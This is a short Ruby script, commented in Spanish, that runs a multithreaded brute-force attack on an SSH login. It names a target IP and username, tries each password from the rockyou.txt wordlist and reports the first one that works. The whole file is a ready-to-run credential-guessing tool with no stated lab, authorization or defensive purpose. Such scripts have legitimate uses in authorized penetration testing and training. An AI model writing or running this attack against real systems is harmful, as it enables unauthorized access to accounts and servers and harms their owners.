require 'net/ssh'

# Configuración del objetivo
HOST = '10.4.244.17'
USER = 'admingauseineri'
DICTIONARY = 'rockyou.txt'

puts "[+] Iniciando ataque de fuerza bruta contra #{HOST}..."

# Leer el diccionario
# Leer el diccionario y llenar la cola
queue = Queue.new
File.foreach(DICTIONARY) do |password|
  queue << password.chomp
end

# Número de hilos (ajusta según lo que soporte tu red/CPU)
THREADS = 4

puts "[+] Iniciando ataque con #{THREADS} hilos..."

workers = (1..THREADS).map do
  Thread.new do
    begin
      while !queue.empty?
        password = queue.pop(true) rescue nil
        break unless password

        print "[*] Probando: #{password} (Hilo #{Thread.current.object_id})\r"
        
        begin
          # Intentar conectar
          Net::SSH.start(HOST, USER, password: password, timeout: 5, keys: [], key_data: [], non_interactive: true, auth_methods: ["password"]) do |ssh|
            puts "\n[!!!] ¡Contraseña encontrada! -> #{password}"
            exit # Terminar el script al encontrarla
          end
        rescue Net::SSH::AuthenticationFailed
          # Fallo de autenticación
        rescue Errno::ECONNREFUSED, Net::SSH::Disconnect, Errno::ETIMEDOUT
          # Error de conexión, devolver a la cola para reintentar o ignorar
          # queue << password 
        rescue StandardError => e
          # Otros errores
        end
      end
    rescue ThreadError
    end
  end
end

workers.each(&:join)

puts "\n[+] Ataque finalizado."